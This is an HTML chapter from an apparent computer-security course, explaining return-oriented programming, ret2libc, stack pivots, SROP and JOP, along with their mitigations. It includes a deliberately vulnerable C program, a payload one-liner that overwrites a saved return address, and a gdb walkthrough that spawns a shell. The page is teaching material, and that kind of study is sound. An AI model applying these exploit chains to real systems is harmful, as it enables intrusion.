@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Code reuse: ROP and friends — deep-roots</title>
+<meta name="description" content="Chapter 03 of module 02: Code reuse: ROP and friends">
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="deep-roots learning program">
+<meta property="og:title" content="Code reuse: ROP and friends — deep-roots">
+<meta property="og:description" content="Chapter 03 of module 02: Code reuse: ROP and friends">
+<meta property="og:url" content="https://srivtx.github.io/deep-roots/">
+<meta property="og:image" content="https://srivtx.github.io/deep-roots/og-image.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Code reuse: ROP and friends — deep-roots">
+<meta name="twitter:description" content="Chapter 03 of module 02: Code reuse: ROP and friends">
+<meta name="twitter:image" content="https://srivtx.github.io/deep-roots/og-image.png">
+<link rel="icon" href="../assets/favicon.svg" type="image/svg+xml">
+<script>(function(){try{var t=localStorage.getItem('roots-theme');if(!t){t=window.matchMedia('(prefers-color-scheme: dark)').matches?'dark':'light';}document.documentElement.setAttribute('data-theme',t);}catch(e){document.documentElement.setAttribute('data-theme','dark');}})();</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,400;0,700;0,900;1,400&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../assets/style.css">
+</head>
+<body>
+<header class="site-header">
+  <a class="brand" href="../index.html"><span class="brand-mark">deep-roots</span><span class="brand-sub">first principles</span></a>
+  <div class="header-right">
+    <nav><a href="../index.html#module-01">Module 01</a><a href="../index.html#roadmap">Modules</a><a href="../quiz.html">Quiz</a><a href="../roadmap.html">Roadmap</a><a href="../index.html#about">About</a><a href="https://github.com/srivtx/deep-roots">GitHub</a></nav>
+    <button class="theme-toggle" aria-label="Toggle dark / light mode" title="Toggle dark / light mode">
+      <svg class="icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
+      <svg class="icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg>
+    </button>
+  </div>
+</header>
+<main class="blog-main">
+<article class="post">
+<div class="post-kicker">module 02 &middot; the dark mirror of module 01</div>
+<h1 class="post-title">Code reuse: ROP and friends</h1>
+<div class="post-meta">chapter 03 &middot; ~15 min read &middot; deep-roots learning program</div>
+<blockquote><strong>The 30-second version.</strong> NX made the stack and heap non-executable, killing the classic "inject shellcode, jump to it" exploit — but not one executable instruction from the process. Every <code>ret</code> is an indirect jump whose target and "program counter" (<code>rsp</code>) the attacker controls after a stack overflow. Chaining existing fragments — gadgets — turns the whole address space into an instruction palette: ret2libc, ROP, SROP, JOP are one insight at different scales. Every mitigation since (ASLR, CFI, CET shadow stack) answers this one observation.</blockquote>
+<h2 id="nx-broke-the-payload-not-the-plan">NX broke the payload, not the plan</h2>
+<p>Chapter 02 ended with control of the saved return address; the 1996 answer was to fill the buffer with machine code and point the saved RIP into it. Data Execution Prevention (AMD NX / Intel XD; Windows XP SP2 2004, OpenBSD W^X 2003) marks stack and heap non-executable at the page-table level — the MMU refuses instruction fetches there, and injected code faults on its first byte (module 01 ch03).</p>
+<p>Re-derive the attacker's options from the instruction set alone. The constraint is only: <em>rip may not enter non-executable pages</em> — everything else (program, libraries, vdso, JIT regions; a stock glibc 2.41 is 2.0 MB) stays executable. The problem was never "I need new code"; it was "I need to compute with the code already mapped." The <code>ret</code> instruction is the loophole: it performs <code>rip ← [rsp]; rsp += 8</code> — an indirect jump whose target and sequencing state are both <em>data the attacker wrote</em>. The timeline followed: Solar Designer's return-into-libc (1997), Shacham's formalization of ROP (2007), and a counter-count that has run ever since.</p>
+<p>The honest statement of NX's effect: it deletes code <em>injection</em> and leaves code <em>reuse</em> fully intact — everything in this chapter is code reuse.</p>
+<h2 id="ret2libc-one-function-one-argument-one-trap">ret2libc: one function, one argument, one trap</h2>
+<p>The minimal reuse: return into one useful libc function — canonically <code>system("sh")</code>: one call, one argument, a shell.</p>
+<p>Three addresses plus the ABI from module 01 ch07. <code>system</code>'s first argument travels in <code>rdi</code>: point it at a <code>"/bin/sh"</code> string — libc contains one (glibc 2.27: offset 0x1b3e9a; per-build, find it with <code>strings -tx libc.so.6 | grep /bin/sh</code>) — using a <code>pop rdi; ret</code> gadget. The chain on the stack, byte-exact (<code>S</code> = the saved-RIP slot the overflow controls):</p>
+<pre><code> higher addresses
+|  0x00000000deadbeef            | S+32 : fake return address (never reached)
++--------------------------------+
+|  &amp;system      (base + 0x4f4e0) | S+24 : callee
++--------------------------------+
+|  &amp;"/bin/sh"   (base + 0x1b3e9a)| S+16 : the word `pop rdi` will consume
++--------------------------------+
+|  &amp;pop-rdi-ret (base + 0x2155f) | S+8  : gadget 1
++--------------------------------+
+|  &amp;ret         (base + 0x8aa)   | S    : overwritten saved RIP — alignment sled
++--------------------------------+       (offsets: glibc 2.27 — re-derive per target;
+                                          the *shape* is universal)</code></pre>
+<p>Then the trap — the most famous crash in exploitation folklore. The SysV x86-64 ABI requires <code>rsp % 16 == 0</code> at the <em>call site</em>, so after <code>call</code> pushes the 8-byte return address, a function entry sees <code>rsp % 16 == 8</code>. Compiled code may use 16-byte-aligned SSE accesses — <code>movaps</code> faults on a non-16-aligned address, unlike its tolerant sibling <code>movups</code> — at offsets computed from that assumption. You entered <code>system</code> with <code>ret</code>, not <code>call</code>, and each <code>ret</code> shifted <code>rsp</code> by 8: whether <code>system</code> starts at <code>rsp ≡ 8</code> or <code>rsp ≡ 0</code> is pure chain-length parity. Wrong parity, and the first <code>movaps</code> on the path faults — the exploit dies <em>after</em> doing everything else right.</p>
+<p>The arithmetic, once, forever: the callee sees <code>rsp = S + 8·k</code>, <code>k</code> = number of <code>ret</code>s executed (the victim's plus one per gadget); if <code>(S + 8·k) % 16 != 8</code>, it is misaligned. The fix is one bare <code>ret</code> gadget (a "ret-sled" of length 1) — no register changes, parity flips by exactly 8. The sled at <code>S</code> exists so <code>system</code> enters at <code>rsp = S + 32</code>, <code>S ≡ 8 (mod 16)</code> giving the ABI-correct <code>rsp ≡ 8</code>.</p>
+<p>Two details worth their weight. The crash <em>signature</em>: #GP, not a page fault — Linux reports SIGSEGV, <code>si_code = SI_KERNEL</code> (128), <code>fault_addr = (nil)</code> (no faulting address); "rip inside libc, no fault address" means suspect alignment, not a wild pointer. And version drift: glibc ≥ 2.34 routes <code>system</code> through <code>posix_spawn</code>, so the famous crash site moved — the ABI rule did not (varargs callees still spill <code>xmm0–xmm7</code> with <code>movaps</code>; the lab makes one do it). Mark your glibc; re-derive, don't remember.</p>
+<h2 id="rop-the-stack-becomes-the-program">ROP: the stack becomes the program</h2>
+<p>ret2libc calls one function. Full ROP generalizes it: define a <em>gadget</em> as any instruction sequence that ends in <code>ret</code> — including sequences that begin at a byte offset <em>inside</em> another instruction's encoding (<code>0x5f</code> is both <code>pop rdi</code> and the ModRM byte of other instructions; enter mid-instruction and the CPU decodes <code>pop rdi; ret</code> from the middle of <code>mov edi, 0x5f...</code>). A <em>chain</em> is gadget addresses and data words laid on the stack; each gadget's <code>ret</code> loads the next entry and advances <code>rsp</code>. With <code>pop</code>/<code>mov [reg], reg</code>/arithmetic gadgets you can assemble arbitrary computation — the stack is your program, <code>rsp</code> its program counter, the "calling convention" whatever your gadgets do.</p>
+<p>Walk a minimal execve chain (x86-64 Linux, syscall 59), watching <code>rsp</code>:</p>
+<pre><code>+----------------------------+  rsp during execution:
+| [gadget: pop rax ; ret]    |  &lt;- victim's ret:      rip←[S],      rsp=S+8
+| [59]                       |  &lt;- pop rax:           rax=59,       rsp=S+16
+| [gadget: pop rdi ; ret]    |  &lt;- ret:               rip←[S+16],  rsp=S+24
+| [&amp;"/bin/sh"]               |  &lt;- pop rdi:           rdi→sh,      rsp=S+32
+| [gadget: pop rsi ; ret]    |  &lt;- ret:               rip←[S+32],  rsp=S+40
+| [0]                        |  &lt;- pop rsi:           rsi=0,       rsp=S+48
+| [gadget: pop rdx ; ret]    |
+| [0]                        |  &lt;- ... same walk ...
+| [gadget: syscall]          |  &lt;- final ret:         rip←[S+64],  rsp=S+72
++----------------------------+     the kernel never returns to the chain — execve
+                                     replaces the process image</code></pre>
+<p>Every step is one <code>ret</code> or one <code>pop</code> — the chain is <em>data</em>; the CPU executes only existing code. ASLR (ch06) forces a libc leak first: Chapter 02's primitives are the prerequisite, not an alternative.</p>
+<p>Hunting gadgets is a solved tooling problem. <code>ROPgadget --binary libc.so.6</code> walks executable segments with capstone, decoding from <em>every</em> byte offset and reporting unique gadget strings — which is why its counts dwarf <code>objdump | grep -c ret</code>. Filters: <code>--only "pop|ret"</code> restricts to those instructions; <code>--depth N</code> bounds instructions per gadget (default 10 — raising it floods you with junk like <code>adc byte ptr [rcx+0x415d5bd8], cl ; pop rsp ; ret</code>); <code>--badbytes "0a00"</code> excludes addresses your input channel can't carry. <code>ropper</code> is the alternative engine (<code>ropper --file libc.so.6 --search "pop rdi" --nocolor</code>); its ROPchain auto-generation is right often enough to check, never to trust.</p>
+<p>Measured, so you know the scale (ROPgadget v7.7, this machine, glibc 2.41, Debian 13): <strong>102,277 unique gadgets</strong> in the stock 2.0 MB libc — 123 sequences with <code>pop rdi</code> (one clean <code>pop rdi ; ret</code>, offset 0x2a145), 486 <code>pop rsp</code>, 770 <code>add rsp</code>, 43 <code>leave ; ret</code>, and one bare <code>syscall</code> at 0x28505 (no <code>syscall ; ret</code> pair in this build — chain <code>pop rax; ret</code> into it). A 20-line <code>-no-pie</code> binary yields 61. Gadget scarcity has never been a defensive strategy.</p>
+<h2 id="small-overflows-stack-pivots">Small overflows: stack pivots</h2>
+<p>Chapter 02's overflows were generous (200 bytes). Real bugs often give you 8–32 bytes — room for the saved RIP, not a 9-word <code>execve</code> chain. The answer: pivot <code>rsp</code> off the victim stack into a region you filled through another channel (a second input copied to <code>.bss</code>, the environment block, or heap spray — ch04's grooming).</p>
+<p>A pivot is any gadget that loads <code>rsp</code> (or <code>esp</code>, zeroing the top half — beware) from a register or memory you control:</p>
+<pre><code>pop rsp ; ret     rsp ← [rsp]      — the next chain word IS the new stack
+leave ; ret       rsp←rbp; rbp←[rsp]  — hijack rbp first, then let the epilogue go
+xchg rax, rsp     rsp ↔ rax        — 1 byte (0x94) on 32-bit, 2-3 on 64-bit
+mov rsp, rdx ; ...                 — direct load, rarer, equally final</code></pre>
+<p>The classic opening: a small overflow into a <em>saved-RBP</em> slot, then <code>[&amp;leave-ret][&amp;fake_stack]</code> — after <code>leave</code>, <code>rsp</code> lives in your sprayed buffer and the chain proceeds normally. "The overflow is too small to matter" is a code-review error: 16 controlled bytes + any pivot + any sprayed buffer = a full ROP stack.</p>
+<h2 id="srop-one-syscall-to-set-every-register">SROP: one syscall to set every register</h2>
+<p>ROP's cost is real: loading six registers for <code>execve</code> is six+ gadgets, each hunted. Signal machinery offers a shortcut, derived from module 01 ch04: to deliver a signal, the kernel builds an <code>rt_sigframe</code> <em>on the user stack</em> — a full image of every register (23 gregs slots = 184 bytes inside a ~248-byte core; glibc's user-side <code>ucontext_t</code> is 968 bytes with fpstate, x86-64 Linux) — jumps to the handler, and later, on syscall 15 (<code>rt_sigreturn</code>) from the restorer, rebuilds <em>all</em> registers from that frame. By design: the only way execution resumes transparently after a signal.</p>
+<p>Read that as an attacker: <code>rt_sigreturn</code> is a "load every register, including rip and rsp, from memory at rsp" instruction. Point <code>rsp</code> at a <em>forged</em> frame, reach a <code>syscall</code> gadget with <code>rax = 15</code>, and the kernel restores your chosen <code>rip</code>, <code>rsp</code>, <code>rdi</code>, <code>rsi</code>, <code>rdx</code> — one gadget, no per-register loading. That is SROP (Bosman &amp; Bos, "Framing Signals", WOOT 2014).</p>
+<pre><code> rsp →  forged frame (values you chose), x86-64 Linux:
++-----------------------------------+
+| rt_sigreturn path / uc header     |   pretcode, flags, link, stack_t
++-----------------------------------+
+| gregs[0..22]  (23 × 8 = 184 B)    |   rax=59, rdi→"/bin/sh", rsi=0, rdx=0,
+|                                   |   rip→syscall gadget, rsp→anywhere safe
++-----------------------------------+
+| fpregs ptr + reserved             |   (zeros suffice for execve)
++-----------------------------------+</code></pre>
+<p>"SROP is 2 syscalls" because a shell via SROP is exactly <code>rt_sigreturn</code> (15) restoring a register set that begins the real syscall, <code>execve</code> (59) — nothing before, nothing between: "find N gadgets" collapses to "find 2 syscalls." The kernel restores userspace state from user memory <em>by design</em>, so this stays viable wherever a <code>syscall</code> gadget is reachable; the 6.6+ shadow-stack design added a restore token to signal frames to complicate forged ones.</p>
+<h2 id="jop-cop-and-the-counter-mitigation-wall">JOP, COP, and the counter-mitigation wall</h2>
+<p><code>ret</code> is the <em>backward edge</em> of control flow; <code>call</code>/<code>jmp</code> through registers the <em>forward edge</em> — and the same idea works there: JOP (jump-oriented programming; Checkoway et al. 2010, "Return-Oriented Programming without Returns") chains gadgets ending in <code>jmp reg</code>/<code>call reg</code>, driven by a <em>dispatch</em> gadget (<code>jmp [rax + rdx*8]</code>-shaped) with the sequence table in memory — control never touches the stack. COP — call-oriented programming — invokes whole <em>legitimate functions</em> with attacker-chosen arguments through indirect call sites. The variants matter because defenses differ per edge: a shadow stack polices only <code>ret</code>; IBT polices only indirect branch targets.</p>
+<p>The counter-mitigation ledger, priced in full in ch06:</p>
+<ul>
+<li><strong>CFI (forward edge)</strong>: clang's <code>-fsanitize=cfi</code> (2015+; <code>cfi-vcall</code> for virtual calls) checks every indirect target against a pre-computed set — killing generic JOP into mid-function addresses; kCFI (Linux 6.1, 2022) does the same in-kernel.</li>
+<li><strong>CET / shadow stack (backward edge)</strong>: Intel CET keeps a second, kernel-managed stack of return addresses; every <code>ret</code> compares its popped target with the shadow copy — mismatch is a control-protection fault, and plain ROP dies. Status as of 2025: <code>endbr64</code> (IBT's landing pad) already sits at function entries in CET-built binaries (this Debian gcc 14.2 lab build emits none; Ubuntu's gcc does), but the <em>shadow stack</em> remains opt-in on Linux (kernel ≥ 6.6 + glibc tunables; no major distro defaults it on); Windows ships hardware-enforced stack protection broadly on supported CPUs.</li>
+</ul>
+<p>Why does ROP persist anyway? Gadget abundance: 102,277 gadgets in one stock libc, and exploits need ~10. Partial deployment: mitigations protect processes that opt in, on CPUs that support them; fleet-mixed vintage leaves years of overlap. Edge coverage: the shadow stack kills ret-chains but leaves forward-edge JOP/COP; CFI kills wild forward edges but leaves returns — until both are on everywhere, one reuse family remains available. Mitigations raise the price of a chain (more bugs per exploit, per ch06); they have not yet retired the technique.</p>
+<h2 id="what-insiders-know">What insiders know</h2>
+<ul>
+<li><strong>The movaps trap's exact shape</strong>: entry <code>rsp % 16 == 8</code> (SysV x86-64); each <code>ret</code> shifts <code>rsp</code> by 8, so <em>chain parity</em>, not luck, decides whether the callee's <code>movaps</code> faults. The crash reads as SIGSEGV, <code>si_code = SI_KERNEL</code> (128), <code>fault_addr = (nil)</code> — a #GP, no address. In gdb: <code>p $rsp &amp; 0xf</code> before your final <code>ret</code>; fix with one bare <code>ret</code> gadget.</li>
+<li><strong>Gadget counts are a measured fact, not folklore</strong>: glibc 2.41 (Debian 13, 2.0 MB) → 102,277 unique gadgets in 2.9 s (ROPgadget v7.7, capstone 5.0.9); 123 <code>pop rdi</code>-bearing sequences, 486 <code>pop rsp</code>, 43 <code>leave ; ret</code>, 770 <code>add rsp</code>, one bare <code>syscall</code>, zero <code>syscall ; ret</code> pairs. Counts are tool/version-dependent — state yours.</li>
+<li><strong>Tool flags that matter</strong>: <code>ROPgadget --only "pop|ret"</code>, <code>--depth N</code> (default 10), <code>--badbytes "0a00"</code>; <code>ropper --search</code> with wildcards. ROPgadget's count beats <code>objdump | grep -c ret</code> because it decodes from every byte offset — the unaligned mid-instruction gadgets invisible in the disassembly you see.</li>
+<li><strong>Why SROP is "2 syscalls"</strong>: <code>rt_sigreturn</code> (15) restores <em>all</em> registers from a forged ~248-byte frame (23 gregs = 184 B, x86-64 Linux); the restored set immediately runs <code>execve</code> (59). Prerequisites: one <code>syscall</code> gadget, a way to set <code>rax = 15</code>, stack control — no per-register gadget hunting.</li>
+<li><strong>CET reality check</strong>: <code>endbr64</code> is widespread in CET-built binaries, but the shadow stack is opt-in on Linux as of 2025 (kernel 6.6+, <code>GLIBC_TUNABLES=glibc.cpu.hwcaps=SHSTK</code>; distros off); the 6.6 signal-frame restore token exists to blunt SROP. Windows leads in default deployment. A ret-chain dies under a shadow stack; JOP/COP forward-edge chains do not.</li>
+<li><strong>The "too small" overflow is a pivot away from full control</strong>: <code>pop rsp; ret</code> or a hijacked <code>rbp</code> + <code>leave; ret</code> migrates <code>rsp</code> into any sprayed buffer — a 16-byte overwrite is a complete ROP precondition, not a mitigated bug.</li>
+</ul>
+<h2 id="see-it-yourself">See it yourself</h2>
+<p>Ten minutes; outputs below were captured on this machine (gcc 14.2, glibc 2.41, ROPgadget v7.7; <code>pip install ROPgadget</code> if needed).</p>
+<pre><code class="language-c">/* vuln.c — the Chapter 02 bug, minimally */
+#include &lt;stdio.h&gt;
+void win(void) { puts("you reached win"); }
+void greet(void) {
+    char name[64];
+    fgets(name, 256, stdin);          /* 256 into 64 */
+    printf("hello %s\n", name);
+}
+int main(void) { greet(); return 0; }</code></pre>
+<pre><code class="language-console">$ gcc -no-pie -fno-stack-protector -g vuln.c -o vuln
+vuln.c:7:5: warning: 'fgets' writing 256 bytes into a region of size 64
+                   overflows the destination [-Wstringop-overflow=]
+$ ROPgadget --binary vuln | tail -2
+0x000000000040100b : test rax, rax ; je 0x401012 ; call rax
+
+Unique gadgets found: 61
+$ ROPgadget --binary vuln --only "ret|pop" | tail -1
+Unique gadgets found: 3
+$ objdump -d vuln | rg -c "\bret\b"
+10</code></pre>
+<p>Notice: 61 gadgets from 10 <code>ret</code> instructions — ROPgadget's unaligned decodes — and no <code>pop rdi</code> in the tiny binary: argument gadgets come from libc. The frame: <code>name</code> at <code>rbp-0x40</code> (64 B) + saved <code>rbp</code> (8 B) = <strong>72 bytes</strong> to the saved RIP. Prove control:</p>
+<pre><code class="language-console">$ nm vuln | rg " win"                       # 0000000000401146 T win
+$ python3 -c "import sys; sys.stdout.buffer.write(b'A'*72 + (0x401146).to_bytes(8,'little'))" \
+    | stdbuf -o0 ./vuln
+hello AAAA...AAAF@
+you reached win
+Segmentation fault</code></pre>
+<p>The crash <em>after</em> <code>win</code> is the lesson: <code>win</code>'s <code>ret</code> pops the zeros the chain left behind — a chain must terminate somewhere safe (<code>exit</code>, or a <code>jmp self</code> gadget), not just reach its goal. Now the alignment trap, self-built: a two-gadget chain into <code>pick</code>, a varargs function whose prologue spills <code>xmm0–xmm7</code> with <code>movaps</code> — the glibc mechanism, by your own hand:</p>
+<pre><code class="language-c">/* chain.c — core (add a SIGSEGV handler printing ucontext rip to see the fault) */
+__attribute__((noinline)) void retg(void) { }          /* a bare `ret` gadget */
+__attribute__((noinline)) double pick(int idx, ...) {  /* varargs: movaps prologue */
+    va_list ap; va_start(ap, idx);
+    double v = 0.0;
+    for (int i = 0; i &lt;= idx; i++) v = va_arg(ap, double);
+    va_end(ap); return v;
+}
+int main(int argc, char **argv) {    /* inline asm: 16-align rsp, lay [pick] or
+                                       [retg][pick] + a fake return address,
+                                       set al != 0, `ret` into the chain */</code></pre>
+<pre><code class="language-console">$ gcc -O2 -no-pie chain.c -o chain
+$ ./chain
+SIGSEGV: rip=0x401238 fault_addr=(nil) si_code=128      &lt;- #GP, not a page fault
+$ objdump -d chain --no-show-raw-insn | rg 401238
+  401238: movaps %xmm0,-0x58(%rsp)                      &lt;- the faulting instruction
+$ ./chain fix                                            &lt;- argv[1]: insert [retg] first
+back in main</code></pre>
+<p><code>[pick]</code> enters at <code>rsp % 16 == 0</code> and dies on the first <code>movaps</code>; prepending one bare <code>ret</code> flips the parity and it survives — the ret2libc folklore with two gadgets you wrote. The real thing under gdb — the classic <code>system("/bin/sh")</code> on glibc 2.27 / Ubuntu 18.04 (offsets illustrative; re-derive per target):</p>
+<pre><code class="language-console">(gdb) b *0x40118e                  # greet's ret (find yours: disas greet)
+(gdb) run &lt; payload_bad            # [pop-rdi-ret][&amp;sh][system]: wrong parity
+(gdb) x/3gx $rsp                   # your chain, about to fire
+(gdb) p $rsp &amp; 0xf                 # $1 = 0x0 -&gt; system will enter at rsp%16==0
+(gdb) c
+Program received signal SIGSEGV, Segmentation fault.
+0x00007ffff7a522c1 in do_system () from libc.so.6
+(gdb) x/i $pc
+   =&gt; movaps XMMWORD PTR [rsp+0x50],xmm0     # the alignment crash, in the flesh
+# prepend one bare `ret` gadget (payload_good) and rerun:
+(gdb) run &lt; payload_good
+$ id
+uid=1000(...)                      # a shell: parity 8, movaps aligned</code></pre>
+<p>On glibc ≥ 2.34 the crash site moved (<code>system</code> → <code>posix_spawn</code>), the rule did not — <code>chain.c</code> demonstrates the mechanism on any vintage.</p>
+<h2 id="how-to-use-this-knowledge">How to use this knowledge</h2>
+<ul>
+<li><strong>Crash triage</strong>: SIGSEGV inside libc with <code>fault_addr = (nil)</code>, <code>si_code = SI_KERNEL</code> is a misaligned-SSE signature, not a wild pointer — check <code>$rsp &amp; 0xf</code> before hunting memory corruption that isn't there.</li>
+<li><strong>Code review pricing</strong>: an overflow is not "small" if any pivot gadget is reachable and any buffer you fill is large — 16 controlled bytes is a full ROP precondition. Fix the bug class, not the byte count.</li>
+<li><strong>Mitigation literacy</strong>: a CVE write-up's steps now name their rungs — leak (beats ASLR), ret-sled (alignment), pivot (small overflow), SROP/JOP (gadget scarcity / shadow stack) — so you can argue what a proposed mitigation would and would not stop.</li>
+<li><strong>The interview answer that derives itself</strong>: "NX doesn't stop exploitation because <code>ret</code> is an indirect jump whose target and sequencing state are attacker data; ASLR makes addresses probabilistic, not privileged; CET's shadow stack finally polices the backward edge — leaving the forward edge, and every un-migrated process, to CFI."</li>
+<li><strong>Defensive design</strong>: own a JIT, a plugin ABI, or any runtime emitting indirect branches and you now know which edge your checks must cover — and why "we're NX-compiled" was never the whole story.</li>
+</ul>
+<h2 id="connections">Connections</h2>
+<ul>
+<li><strong>Module 01 ch04 (the stack)</strong> — every chain is that chapter's frame diagram weaponized: <code>call</code>/<code>ret</code> as stack machinery; SROP, the kernel's own signal frames turned around.</li>
+<li><strong>Module 01 ch07 (assembly)</strong> — the ABI's 16-byte alignment, <code>endbr64</code> at entries, and reading disassembly are the grammar gadget hunting is written in.</li>
+<li><strong>Module 02 ch02 (stack exploitation)</strong> — supplied the saved-RIP control and libc leak every chain here begins with; canary bypasses were the toll.</li>
+<li><strong>Module 02 ch06 (the mitigation ladder)</strong> — prices ASLR, CFI, CET, PAC, MTE against exactly the techniques of this chapter, with bypass ledgers.</li>
+<li><strong>Module 04 ch03 (reading disassembly)</strong> — gadget hunting <em>is</em> compiler-idiom reading; that chapter industrializes the eye you used on <code>greet</code>.</li>
+</ul>
+<h2 id="quiz">Quiz</h2>
+<ol>
+<li><strong>Concept.</strong> NX marks the stack and heap non-executable. Derive, from the semantics of <code>ret</code> alone, why this stops zero percent of saved-RIP control.</li>
+<li><strong>Concept.</strong> Define a gadget. Why does ROPgadget report 61 gadgets for a binary whose disassembly contains only 10 <code>ret</code> instructions?</li>
+<li><strong>Predict the layout.</strong> In <code>vuln.c</code>, <code>name</code> sits at <code>rbp-0x40</code> and the saved RIP at <code>rbp+8</code>: how many filler bytes reach the saved RIP? With the chain <code>[pop rdi;ret][&amp;sh][system]</code> starting at saved-RIP slot <code>S</code>, <code>S % 16 == 8</code>: what is <code>rsp % 16</code> when <code>system</code> begins, and what does that mean if its path uses <code>movaps</code>?</li>
+<li><strong>Predict the behavior.</strong> Same chain, but now <code>[ret][pop rdi;ret][&amp;sh][system]</code>. When <code>system</code> starts, what value does <code>rdi</code> hold, what does <code>[rsp]</code> contain, and what is <code>rsp % 16</code>?</li>
+<li><strong>Bug diagnosis.</strong> An exploit crashes mid-libc: SIGSEGV, <code>si_code = SI_KERNEL</code> (128), <code>fault_addr = (nil)</code>, <code>rip</code> pointing at a <code>movaps</code>. What happened, and what one-gadget change fixes it?</li>
+<li><strong>Bug diagnosis.</strong> The ret2win payload above prints <code>you reached win</code> and then segfaults. Why, in terms of the chain? How should a real chain terminate?</li>
+<li><strong>Cross-chapter.</strong> SROP works because the kernel builds a register image on the user stack when delivering a signal (module 01 ch04's machinery, used by the kernel). Why is a shell via SROP exactly 2 syscalls, and what three things must the attacker control?</li>
+<li><strong>Bug diagnosis.</strong> A ret-chain <code>[pop rdi;ret][&amp;sh][system]</code> is launched against a process running with Intel CET's shadow stack enabled (and IBT). Where exactly does it fail, and which code-reuse family from this chapter remains available?</li>
+</ol>
+<details>
+<summary>Answers</summary>
+<ol>
+<li><code>ret</code> executes <code>rip ← [rsp]; rsp += 8</code>. The saved RIP is attacker data, so <code>rip</code> becomes an attacker-chosen address <em>inside already-executable pages</em>, and <code>rsp</code> a pointer into attacker data the next <code>ret</code> consumes. <code>ret</code> fetches an <em>address</em> from the stack, not an instruction — saved-RIP control is an indirect jump into the existing, deliberately-executable code base.</li>
+<li>A gadget is any instruction sequence ending in <code>ret</code>, entered at <em>any byte offset</em> — including mid-instruction bytes (<code>0x5f</code> inside another encoding still decodes as <code>pop rdi</code>). ROPgadget disassembles from every offset, so one real <code>ret</code> can terminate many distinct gadgets; mid-instruction entries multiply the count far past the 10 visible <code>ret</code>s.</li>
+<li>64 + 8 = <strong>72</strong> filler bytes. The victim's <code>ret</code> pops the <code>pop rdi;ret</code> at <code>S</code> → <code>rsp = S+8</code>; <code>pop rdi</code> consumes <code>&amp;sh</code> at <code>S+8</code> → <code>rsp = S+16</code>; the gadget's <code>ret</code> pops <code>system</code> at <code>S+16</code> → entry <code>rsp = S+24 ≡ 0 (mod 16)</code>. The ABI expects <code>rsp ≡ 8</code> — misaligned, so the callee's first <code>movaps</code> faults and the exploit dies.</li>
+<li><code>rdi</code> = <code>"/bin/sh"</code>'s address (<code>pop rdi</code> consumed <code>&amp;sh</code>). <code>[rsp]</code> = the fake return address following <code>system</code>'s slot — the chain word at <code>S+32</code>; if <code>system</code> ever returns, that is where it returns to. <code>rsp = S+32 ≡ 8 (mod 16)</code> — the prepended <code>ret</code> added 8 bytes, flipping parity to the ABI-correct value; the <code>movaps</code> path survives.</li>
+<li>The callee's entry <code>rsp</code> was misaligned by 8, so its SSE code executed <code>movaps</code> on a non-16-aligned address — a general-protection fault (#GP), which Linux reports as SIGSEGV with <code>si_code = SI_KERNEL</code> and <em>no</em> fault address. Fix: prepend one bare <code>ret</code> gadget (each <code>ret</code> shifts entry <code>rsp</code> by 8).</li>
+<li><code>win</code>'s <code>ret</code> popped the next stack word — the zeros left past the overwritten slot — into <code>rip</code> and jumped to ~0: the chain ran off its end. Terminate deliberately: return into <code>exit</code>, end with a <code>jmp $</code> (harmless loop), or — like the execve chain — never return at all, because the syscall replaces the process image.</li>
+<li>Syscall 1 is <code>rt_sigreturn</code> (15): with <code>rsp</code> at a forged frame it restores <em>every</em> register from user memory — <code>rip</code>, <code>rsp</code>, <code>rdi/rsi/rdx</code>, <code>rax</code> — and the restored state begins syscall 2, <code>execve("/bin/sh", 0, 0)</code> (59). The whole shell is sigreturn + execve. Needs: (1) a <code>syscall</code> gadget, (2) <code>rax = 15</code> (e.g. <code>pop rax; ret</code>), (3) stack contents for the ~248-byte frame.</li>
+<li>It fails at the victim's own <code>ret</code> — the first one: the shadow stack holds the <em>real</em> return address the original <code>call</code> pushed; the popped value is the attacker's gadget; the mismatch raises a control-protection fault (IBT is never reached — it polices indirect branch <em>targets</em>, and a <code>ret</code> isn't one). What survives: forward-edge reuse — JOP (<code>jmp/call reg</code> chains driven by a dispatch table) and COP through legitimate indirect-call sites — since the shadow stack checks only returns; covering those needs CFI (ch06).</li>
+</ol>
+</details>
+<nav class="chapter-nav">
+<a class="prev" href="ch02.html"><span class="cn-label">previous</span><span class="cn-title">Ch 02</span></a>
+<a class="next" href="ch04.html"><span class="cn-label">next</span><span class="cn-title">Ch 04</span></a>
+</nav>
+<div class="post-footer"><p>This chapter is part of <a href="index.html">Module 02 — Memory security &amp; exploitation</a>. Markdown source lives with the module. When done, take the <a href="final-exam.html">module final exam</a>. The work ledger is <a href="https://github.com/srivtx/deep-roots/blob/main/agents.md">agents.md</a>.</p></div>
+</article>
+</main>
+<footer class="site-footer">
+  <div class="footer-inner">
+    <div>
+      <div class="f-brand">deep-roots</div>
+      <div class="f-note">
+        computer science from first principles &middot; the root knowledge each field keeps
+        to itself &middot; memory models first, everything else after &middot;
+        dark and light, like a good reading room
+      </div>
+    </div>
+    <div class="footer-links">
+      <a href="../index.html">Home</a>
+      <a href="../index.html#module-01">Module 01</a>
+      <a href="../quiz.html">Quiz</a>
+      <a href="../roadmap.html">Roadmap</a>
+      <a href="https://github.com/srivtx/deep-roots">GitHub</a>
+      <a href="https://github.com/srivtx/deep-roots/blob/main/agents.md">agents.md</a>
+    </div>
